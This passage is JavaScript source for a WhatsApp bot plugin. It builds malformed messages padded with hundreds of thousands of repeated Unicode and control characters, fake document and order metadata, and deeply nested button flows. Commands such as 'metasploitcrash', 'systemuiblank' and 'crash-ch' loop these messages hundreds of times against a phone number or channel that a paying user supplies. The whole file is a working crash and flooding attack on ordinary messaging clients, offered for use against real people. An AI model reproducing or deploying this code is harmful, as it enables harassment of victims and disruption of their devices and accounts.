        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: -999.03499999999999,
                  degreesLongitude: 999.03499999999999,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                  "DilxzВаэлтрикс͢ ϟ\n" + "ꦾ".repeat(30000) +
                  "\u0003".repeat(10000) +
                  "@22222".repeat(20000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [target],
                groupMentions: [
                  {
                    groupJid: "0@newsletter",
                    groupSubject: "##",
                  },
                ],
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
}

async function ioskeresh(target) {
rafiganteng.relayMessage(target, {
'extendedTextMessage': {
'text': '.',
'contextInfo': {
'stanzaId': target,
'participant': target,
'quotedMessage': {
							'conversation': 'DilxzВаэлтрикс͢ ϟ' + 'ꦾ'.repeat(50000)
						},
						'disappearingMode': {
							'initiator': "CHANGED_IN_CHAT",
							'trigger': "CHAT_SETTING"
						}
					},
					'inviteLinkGroupTypeV2': "DEFAULT"
				}
			}, {
				'participant': {
					'jid': target
				}
			}, {
				'messageId': null
			});
			console.log(chalk.green(""));
		};

async function flowkresh(target) {
  let sections = [];
  for (let i = 0; i < 10; i++) {
let largeText = "DilxzВаэлтрикс͢ ϟ".repeat(25);
let deepNested = {
  title: `Super Deep Nested Section ${i}`,
  highlight_label: `Extreme Highlight ${i}`,
  rows: [
{
  title: largeText,
  id: `id${i}`,
  subrows: [
{
  title: "Nested row 1",
  id: `nested_id1_${i}`,
  subsubrows: [
{
  title: "Deep Nested row 1",
  id: `deep_nested_id1_${i}`,
},
{
  title: "Deep Nested row 2",
  id: `deep_nested_id2_${i}`,
},
  ],
},
{
  title: "Nested row 2",
  id: `nested_id2_${i}`,
},
  ],
},
  ],
};
sections.push(deepNested);
  }
  let listMessage = {
title: "Massive Menu Overflow",
sections: sections,
  };
  let message = {
viewOnceMessage: {
  message: {
messageContextInfo: {
  deviceListMetadata: {},
  deviceListMetadataVersion: 2,
},
interactiveMessage: {
  contextInfo: {
mentionedJid: [target],
isForwarded: true,
forwardingScore: 999,
businessMessageForwardInfo: {
  businessOwnerJid: target,
},
  },
  body: {
text: "P",
  },
  nativeFlowMessage: {
buttons: [
  {
name: "single_select",
buttonParamsJson: "JSON.stringify(listMessage)",
  },
  {
name: "call_permission_request",
buttonParamsJson: "JSON.stringify(listMessage)",
  },
  {
name: "mpm",
buttonParamsJson: "JSON.stringify(listMessage)",
  },
  {
name: 'galaxy_message',
paramsJson: `{\"screen_2_OptIn_0\":true,           \"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"hiraNotDev@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(355000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
version: 3 
},
],
  },
},
  },
},
  };
  await rafiganteng.relayMessage(target, message, {
participant: { jid: target },
  });
}

const cursor = {
key: {
fromMe: false,
participant: "0@s.whatsapp.net",
remoteJid: ""
},
message: {
buttonsMessage: {
hasMediaAttachment: true,
contentText: ``,
footerText: ``,
buttons: [
{ buttonId: "\u0003".repeat(749999), buttonText: { displayText: "DilxzВаэлтрикс͢ ϟ" }, type: 1, nativeFlowInfo: { name: "single_select", paramsJson: "{}" } }
], 
viewOnce: true,
headerType: 1
}
}, 
contextInfo: {
virtexId: rafiganteng.generateMessageTag(),
participant: "0@s.whatsapp.net",
mentionedJid: ["0@s.whatsapp.net"],
}, 
};

async function QpayMsg(target) {
const etc = generateWAMessageFromContent(
target,
proto.Message.fromObject({
ephemeralMessage: {
message: {
interactiveMessage: {
header: {
documentMessage: {
url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
mimetype: "application/vnd.openxmlformats-officedocument.presentationml.slideshow",
fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
fileLength: "974197419741",
pageCount: "974197419741",
mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
fileName: "DilxzВаэлтрикс͢ ϟ",
fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
mediaKeyTimestamp: "1715880173",
contactVcard: true,
},
hasMediaAttachment: true,
jpegThumbnail: setting.tampilan
},
orderMessage: {
orderId: "CRASHCODE9471",
thumbnail: setting.tampilan,
itemCount: 999999999,
status: "INQUIRY",
surface: "CATALOG",
message:
"DilxzВаэлтрикс͢ ϟ" +
"᭄".repeat(103000) +
"ꦾ".repeat(70000),
orderTitle: "INFINITY",
sellerJid: "13135550002@s.whatsapp.net",
token:
"AR5rcf+zsk2VFs9+l8RFDB34fYqsUY0nQxBMAjE66D0nFQ==",
totalAmount1000: "100000019492000",
totalCurrencyCode: "IDR",
messageVersion: 2,
},
contextInfo: {
stanzaId: rafiganteng.generateMessageTag(),
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
mentionedJid: [target, "13135550002@s.whatsapp.net"],
quotedMessage: {
buttonsMessage: {
documentMessage: {
url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc",
mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
fileLength: "9999999999999",
pageCount: 3567587327,
mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
fileName: "DilxzВаэлтрикс͢ ϟ",
fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc",
mediaKeyTimestamp: "1735456100",
contactVcard: true,
caption: "DilxzВаэлтрикс͢ ϟ"
},
contentText: "\"😮‍💨\"",
footerText: "",
buttons: [
{
buttonId: "\u0003".repeat(900000),
buttonText: {
    displayText: "⩟"
},
type: 1
}
],
headerType: 3
}
}
}
}
}
}
}),
{
userJid: target,
quoted: cursor
}
);

await rafiganteng.relayMessage(target, etc.message, {
participant: { jid: target },
messageId: etc.key.id
});
}


async function NativeCore(target) {
  let NativeCore = {
viewOnceMessage: {
  message: {
messageContextInfo: {
  deviceListMetadata: {},
  deviceListMetadataVersion: 2,
},
interactiveMessage: {
  contextInfo: {
mentionedJid: ["13135550002@s.whatsapp.net"],
isForwarded: true,
forwardingScore: 999,
businessMessageForwardInfo: {
  businessOwnerJid: target,
},
dataSharingContext: {
  showMmDisclosure: true,
},
  },
  body: {
title: "👑",
text: "DilxzВаэлтрикс͢ ϟ" + "᭄".repeat(9741),
description: "💌",
footer: "",
  },
  nativeFlowMessage: {
buttons: [
  { name: "single_select", buttonParamsJson: "" },
  { name: "view_product", buttonParamsJson: "" },
  { name: "payment_method", buttonParamsJson: "" },
  { name: "call_permission_request", buttonParamsJson: "" },
  { name: "mpm", buttonParamsJson: "" },
  { name: "payment_info", buttonParamsJson: "" },
],
  },
},
  },
},
  };
  await rafiganteng.relayMessage(target, NativeCore, {
participant: { jid: target },
  });
  console.log("")
}
    
 async function DilxzCrash(target) {
    for (let i = 0; i <= 50; i++) {
    await CrashJids(target)
    await extendetX(target)
    await buttonscrashX(target)
    await buttoncast(target)
    await paymentCrash(target)
    await NativeCore(target)
    await ioskeresh(target)
    await flowkresh(target)
    await QpayMsg(target)
    }
}

async function DilxzIosBlank(target) {
    for (let i = 0; i <= 50; i++) {
    await IosLocation(target)
    await TrashIos(target)
    }
}

async function DilxzInvisible(target) {
    for (let i = 0; i <= 50; i++) {
    await UiScorpio(target)
    await letterCrash(target)
    await LocUiNew(target)
    }
}

async function DilxzBlankUi(target) {
    for (let i = 0; i <= 50; i++) {
    await bulldozer(target)
    await locationInvis(target)
    await protocolxaudio(target)
    await protocol5(target)
    }
}

async function DilxzForce(target) {
    for (let i = 0; i <= 50; i++) {
    await CursorCrL(target)
    await DocxSystemUi(target) 
    await VampNewCrash(target) 
    }
}

async function DilxzCombo(target) {
    for (let i = 0; i <= 50; i++) {
    await bulldozer(target)
    await locationInvis(target)
    await protocolxaudio(target)
    await protocol5(target)
    await UiScorpio(target)
    await letterCrash(target)
    await LocUiNew(target)
    await IosLocation(target)
    await TrashIos(target)
    await CrashJids(target)
    await extendetX(target)
    await buttonscrashX(target)
    await buttoncast(target)
    await paymentCrash(target)
    await NativeCore(target)
    await ioskeresh(target)
    await flowkresh(target)

    await CrashJids(target)
    await extendetX(target)
    await buttonscrashX(target)
    await buttoncast(target)
    await paymentCrash(target)
    await NativeCore(target)
    await ioskeresh(target)
    await flowkresh(target)

    }
}
switch (command) {
case "rafihackercombo": {
    if (!ismurbug) return m.reply('[ ! ] Khusus User murbug');
    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";   
    m.reply(bugres)    
    for (let i = 0; i < 250; i++) {
        await DilxzCombo(target);
        await DilxzCombo(target);
        await DilxzCombo(target);
        await DilxzCombo(target);
        await DilxzCombo(target);
        await DilxzCombo(target);
        await DilxzCombo(target);
        await DilxzCombo(target);
        await DilxzCombo(target);
        await DilxzCombo(target);
    }
}
break
case "metasploitcrash": case "voids": {
if (!ismurbug) return m.reply('[ ! ] Khusus User murbug')
if (!q) return m.reply(`Example: ${prefix + command} 628××`)
let target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(bugres)
for (let i = 0; i < 250; i++) {
await DilxzCrash(target)
await DilxzCrash(target)
await DilxzCrash(target)
await DilxzCrash(target)
await DilxzCrash(target)
await DilxzCrash(target)
await DilxzCrash(target)
await DilxzCrash(target)
await DilxzCrash(target)
await DilxzCrash(target)
}
m.reply(`Suscesfully sending bug to\n${target} ✅`)
}
break
case "rafihackerios": case "locios": {
if (!ismurbug) return m.reply('[ ! ] Khusus User murbug')
if (!q) return m.reply(`Example: ${prefix + command} 628××`)
let target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(bugres)
for (let i = 0; i < 250; i++) {
await DilxzIosBlank(target)
await DilxzIosBlank(target)
await DilxzIosBlank(target)
await DilxzIosBlank(target)
await DilxzIosBlank(target)
await DilxzIosBlank(target)
await DilxzIosBlank(target)
await DilxzIosBlank(target)
await DilxzIosBlank(target)
await DilxzIosBlank(target)
}
m.reply(`Suscesfully sending bug to\n${target} ✅`)
}
break
case "systemuiblank": case "blanking": {
if (!ismurbug) return m.reply('[ ! ] Khusus User murbug')
if (!q) return m.reply(`Example: ${prefix + command} 628××`)
let target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(bugres)
for (let i = 0; i < 250; i++) {
await DilxzBlankUi(target)
await DilxzBlankUi(target)
await DilxzBlankUi(target)
await DilxzBlankUi(target)
await DilxzBlankUi(target)
await DilxzBlankUi(target)
await DilxzBlankUi(target)
await DilxzBlankUi(target)
await DilxzBlankUi(target)
await DilxzBlankUi(target)
}
m.reply(`Suscesfully sending bug to\n${target} ✅`)
}
break
case "metasploitinvis": case "mention": {
if (!ismurbug) return m.reply('[ ! ] Khusus User murbug')
if (!q) return m.reply(`Example: ${prefix + command} 628××`)
let target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(bugres)
for (let i = 0; i < 250; i++) {
await DilxzInvisible(target)
await DilxzInvisible(target)
await DilxzInvisible(target)
await DilxzInvisible(target)
await DilxzInvisible(target)
await DilxzInvisible(target)
await DilxzInvisible(target)
await DilxzInvisible(target)
await DilxzInvisible(target)
await DilxzInvisible(target)
}
m.reply(`Suscesfully sending bug to\n${target} ✅`)
}
break
case "metasploitforce": {
if (!ismurbug) return m.reply('[ ! ] Khusus User murbug')
if (!q) return m.reply(`Example: ${prefix + command} 628××`)
let target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(bugres)
for (let i = 0; i < 250; i++) {
await DilxzForce(target)
await DilxzForce(target)
await DilxzForce(target)
await DilxzForce(target)
await DilxzForce(target)
await DilxzForce(target)
await DilxzForce(target)
await DilxzForce(target)
await DilxzForce(target)
await DilxzForce(target)
}
m.reply(`Suscesfully sending bug to\n${target} ✅`)
}
break
case "force-ch": case "crash-ch": {
    if (!ismurbug) return m.reply('[ ! ] Khusus User murbug')
    const targetChannel = args[0];
    if (!targetChannel) {
        return m.reply(`Example: ${prefix + command} 123××@newsletter`)
    }
    await rafiganteng.sendMessage(m.chat, {
        image: { url: setting.tampilan },
        caption: "process sending bug channel 🦠",
        contextInfo: {
            externalAdReply: {
                title: global.setting.namabot,
                body: "developer bot" + global.namadev,
                sourceUrl: "",
            },
        },
    });

    for (let i = 0; i < 200; i++) {
        try {
            await CrashJids(targetChannel);
            await CrashJids(targetChannel);
            await CrashJids(targetChannel);
            await CrashJids(targetChannel);
            await CrashJids(targetChannel);

            if (i === 10) {
                await rafiganteng.sendMessage(m.chat, {
                    text: `being processed sending... (${i}/${total})`,
                });
            }
        } catch (error) {
            console.error("Gagal mengirim ke Channel:", error);
            return m.reply("Terjadi kesalahan saat mengirim ke Channel.");
        }
        await sleep(1000);
    }

    await rafiganteng.sendMessage(m.chat, {
        image: { url: setting.tampilan },
        caption: "success sending bug channel 🦠",
        contextInfo: {
            externalAdReply: {
                title: global.setting.namabot,
                body: "developer bot" + global.namadev,
                sourceUrl: "",
            },
        },
    });

    m.reply("Succesfully sending bug channel ✅");
}
break;
}
}
handler.tags =['bug']
handler.help = handler.command = ['force-ch', 'metasploitforce', 'metasploitinvis', 'systemuiblank', 'rafihackerios', 'rafihackercombo']
export default handler